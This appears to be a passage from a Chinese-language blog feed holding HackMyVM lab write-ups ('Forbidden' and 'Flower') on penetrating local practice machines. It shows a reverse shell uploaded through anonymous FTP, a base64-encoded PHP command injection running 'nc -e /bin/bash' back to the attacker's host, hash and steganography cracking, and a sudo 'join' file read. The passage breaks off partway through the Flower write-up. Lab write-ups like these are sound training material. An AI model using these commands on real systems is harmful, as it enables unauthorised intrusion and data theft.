gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,js,jpg</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/robots.txt           (Status: 200) [Size: 10]</span><br><span class="line">/note.txt             (Status: 200) [Size: 75]</span><br><span class="line"><span class="section">Progress: 1038215 / 1038220 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure></div>
<p>扫描结果没有显示多余的信息，那现在的目标只能放在ftp上了，因为web这里已经没有多余的信息。<br>刚才利用ftp下载文件，现在我们也能利用ftp上传文件，因为ftp匿名访问的就是www目录，里面的note.txt就是web可以访问到的路径<br>但是这里一直说php不能执行，我们知道php还有很多扩展名，我们都试试   php3，php5，pht，phtml，phps 都是 php 可运行的文件扩展名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.php3</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.php5</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.phps</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.pht </span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.58.239</span><br><span class="line">Connected to 192.168.58.239.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||5545|)</span><br><span class="line">553 Could not create file.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||36869|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 www</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd www</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||15003|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       30.83 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (557.10 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.php5</span></span><br><span class="line"><span class="strong">local: shell.php5 remote: shell.php5</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||57590|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       30.65 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (930.02 KiB/s)</span><br><span class="line">ftp&gt; put shell.phps</span><br><span class="line">local: shell.phps remote: shell.phps</span><br><span class="line">229 Entering Extended Passive Mode (|||50303|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       11.77 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (857.65 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.pht</span></span><br><span class="line"><span class="strong">local: shell.pht remote: shell.pht</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||34415|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       25.44 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (838.49 KiB/s)</span><br></pre></td></tr></table></figure></div>
<p>把反弹shell的php文件更改后缀名之后都上传到www目录下面<br>尝试之后发现php5可以，（这里我第一次把php中的ip写错了，所以改了一下名称） 成功拿到了webshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234            </span><br><span class="line">Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="line"> 03:22:44 up 31 min,  0 users,  load average: 0.35, 0.18, 0.27<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">└─# curl 192.168.58.239/shell1.php5 </span></span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>www用户没有sudo权限<br>然后根据上面web的提示，要找到jpg文件<br>找到了之后发现有python3 直接用python3开启http服务，本机上wget下载这个图片</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:/home</span><span class="variable">$ </span>find / -name <span class="string">&quot;*.jpg&quot;</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/var/www/html/<span class="variable constant_">TOPSECRETIMAGE</span>.jpg</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>which python3</span><br><span class="line">/usr/bin/python3</span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>python3 -m http.server</span><br><span class="line"><span class="title class_">Serving</span> <span class="variable constant_">HTTP</span> on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (<span class="symbol">http:</span>/<span class="regexp">/0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
<p>用stegseek破解一下这个图片</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># stegseek  -f TOPSECRETIMAGE.jpg -wl rockyou.txt </span></span><br><span class="line">StegSeek <span class="number">0.6</span> <span class="operator">-</span> https:<span class="symbol">//github.com/RickdeJager/StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] Found <span class="params">passphrase:</span> <span class="string">&quot;portugal&quot;</span></span><br><span class="line">[i] Original <span class="params">filename:</span> <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;TOPSECRETIMAGE.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># steghide extract -sf TOPSECRETIMAGE.jpg        </span></span><br><span class="line">Enter <span class="params">passphrase:</span> </span><br><span class="line">wrote extracted data to <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># unzip TOPSECRETIMAGE.jpg.out </span></span><br><span class="line"><span class="params">Archive:</span>  TOPSECRETIMAGE.jpg.out</span><br><span class="line">[TOPSECRETIMAGE.jpg.out] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span>    </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># unzip pass.zip </span></span><br><span class="line"><span class="params">Archive:</span>  pass.zip</span><br><span class="line">[pass.zip] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">   <span class="params">skipping:</span> pass.txt                incorrect password</span><br></pre></td></tr></table></figure></div>
<p>但是发现用这个爆破出来的passphrase只能获取zip,不是zip的解压密码，所以用zip2john把这个zip变成可以让john爆破的形式</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">                                                                                                                                                       </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># zip2john pass.zip &gt; tmp </span></span><br><span class="line">ver 2.0 efh 5455 efh 7875 pass.zip/pass.txt PKZIP Encr: TS_chk, cmplen=66, decmplen=71, crc=E22A2397 ts=9831 cs=9831 type=8</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># john tmp                                                                                   </span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash <span class="params">(PKZIP [32/64])</span></span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules<span class="function">:Single</span></span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:<span class="string">/usr/share/john/password.lst</span></span><br><span class="line">secret           <span class="params">(pass.zip/pass.txt)</span>     </span><br><span class="line">1g 0<span class="function">:00</span><span class="function">:00</span><span class="function">:00</span> DONE 2/3 <span class="params">(2025-03-02 16:34)</span> 100.0g/s 3069Kp/s 3069Kc/s 3069KC/s 123456.<span class="string">.ferrises</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># unzip pass.zip              </span></span><br><span class="line">Archive:  pass.zip</span><br><span class="line">[pass.zip] pass.txt password: </span><br><span class="line">replace pass.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y</span><br><span class="line">  inflating: pass.txt                </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br></pre></td></tr></table></figure>
<p><img src="https://pic1.imgdb.cn/item/67c4189ad0e0a243d409f6d2.png"></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># echo vGffXfDreF453 | base64 -d                           </span></span><br><span class="line">¼gß]ðëx^9base64: invalid input</span><br></pre></td></tr></table></figure>
<p>我尝试用<code>vGffXfDreF453</code>这个密码，发现不是哪一个用户的密码<br>这里没有思路了，看了下wp，返现这个jpg文件的名字就是密码，，，啊  这个名字确实很奇怪，还是大写的，应该注意到的😲</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">marta<span class="variable">@forbidden</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> marta on <span class="symbol">forbidden:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> marta may run the following commands on <span class="symbol">forbidden:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/join</span><br></pre></td></tr></table></figure></div>
<p>在gtfobins里面可以找到提权方法，这个join命令是根据两个文件的共同字段合并行，类似于 SQL 的 JOIN 操作。可以利用这个读取任意文件<br><code>sudo join -a 2 /dev/null $LFILE</code>  -a 2这个参数的意思是输出第二个文件中所有行，即使这些行在第一个文件中没有匹配项。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">marta@forbidden:/home$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /home/markos/user.txt     </span><br><span class="line">HMVpussycat</span><br><span class="line"></span><br><span class="line">marta@forbidden:~$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /root/root.txt</span><br><span class="line">HMVmymymymymind</span><br></pre></td></tr></table></figure></div>


<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对ftp的用法更加了解，包括上传文件和下载文件， 对于可以控制www目录的时候应该更加注意，可以上传反弹shell 的php<br>在不能用php的时候考虑不同的扩展名<br>对于一些文件的名字也要更加敏感，包括一些看起来像密码的文件名<br>学习到了join命令是什么，以及利用的方法</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Flower</title>
    <url>/posts/44298.html</url>
    <content><![CDATA[<p>HMV-Flower靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679f5f3cd0e0a243d4f99695.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.115         </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">02</span> <span class="number">19</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.115</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">1</span>A:<span class="number">69</span>:<span class="number">75</span>:<span class="number">79</span>:<span class="number">70</span>:<span class="number">92</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.79</span> ms <span class="number">192.168</span>.<span class="number">240.115</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.02</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>只开放了80web端口</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p><img src="https://pic1.imgdb.cn/item/679f5370d0e0a243d4f993d8.png"><br>web端只有一个提交按钮，但是也不能上传文件<br>跑一下目录，也没有发现什么有作用的<br>看一下页面的源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">flower.jpg</span>) no-repeat center center fixed; </span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">     &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;background-color:pink;&quot;</span>&gt;</span>Count Petals<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;flowers&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:pink;&quot;</span>&gt;</span>Choose a flower to count petals:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;petals&quot;</span> <span class="attr">form</span>=<span class="string">&quot;flosub&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Lily&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MSsy&quot;</span>&gt;</span>Lily<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Buttercup&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Misz&quot;</span>&gt;</span>Buttercup<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Delphiniums&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mys1&quot;</span>&gt;</span>Delphiniums<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Cineraria&quot;</span> <span class="attr">value</span>=<span class="string">&quot;NSs4&quot;</span>&gt;</span>Cineraria<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Chicory&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OCsxMw==&quot;</span>&gt;</span>Chicory<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Chrysanthemum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MTMrMjE=&quot;</span>&gt;</span>Chrysanthemum<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Michaelmas daisies&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MjErMzQ=&quot;</span>&gt;</span>Michaelmas daisies<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;/<span class="name">select</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flosub&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>value 中的值是base64加密之后的计算式 petals这个参数用post请求发送,猜测存在命令执行漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;MSsy&quot;</span> | <span class="built_in">base64</span> --decode              </span><br><span class="line">1+2   </span><br></pre></td></tr></table></figure></div>
<p>所以用bp修改包内容，用petals发送base64加密之后的指令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;system(&#x27;pwd&#x27;)&quot;</span> | <span class="built_in">base64</span>  </span><br><span class="line">c3lzdGVtKCdwd2QnKQo=</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/679f5780d0e0a243d4f99573.png"><br>用这种方法反弹shell 拿到www-data的shell<br><code>system(&#39;nc -e /bin/bash 192.168.240.83 1234&#39;)</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234            </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home</span><span class="variable">$ </span>sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">flower:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">flower:</span></span><br><span class="line">    (rose) <span class="symbol">NOPASSWD:</span> /usr/bin/python3 /home/rose/diary/diary.py</span><br></pre></td></tr></table></figure></div>
<p>www用户可以执行rose用户的一个脚本<br>看看这个py脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">www-data@flower:<span class="regexp">/home$ cat /</span>home<span class="regexp">/rose/</span>diary/diary.py</span><br><span class="line">cat <span class="regexp">/home/</span>rose<span class="regexp">/diary/</span>diary.py</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">diary = &#123;<span class="string">&quot;November28&quot;</span>:<span class="string">&quot;i found a blue viola&quot;</span>,<span class="string">&quot;December1&quot;</span>:<span class="string">&quot;i lost my blue viola&quot;</span>&#125;</span><br><span class="line">p = open(<span class="string">&#x27;diary.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.<span class="keyword">dump</span>(diary,p)</span><br></pre></td></tr></table></figure></div>
<p>看了wp知道diary.py其实是可以写入文件的 所以写入在pickle中，因为脚本所在的目录是可以控制的</p>
